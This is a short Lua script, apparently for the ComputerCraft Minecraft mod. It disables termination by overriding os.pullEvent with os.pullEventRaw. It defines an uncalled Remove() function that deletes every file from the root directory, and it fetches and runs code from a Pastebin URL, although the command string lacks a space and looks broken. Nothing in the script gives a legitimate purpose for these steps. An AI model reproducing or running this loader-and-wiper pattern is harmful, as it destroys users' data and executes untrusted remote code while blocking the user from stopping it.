os.pullEvent = os.pullEventRaw


-- Start of Variables
local URL = "https://pastebin.com/raw/c33tkL5Y"
-- End of Variables


-- Start of Functions
function Remove()
    shell.run("cd /")
    shell.run("delete *")
end
-- End of Functions


-- Start of Program
shell.run("pastebin run" .. URL)
-- End of Program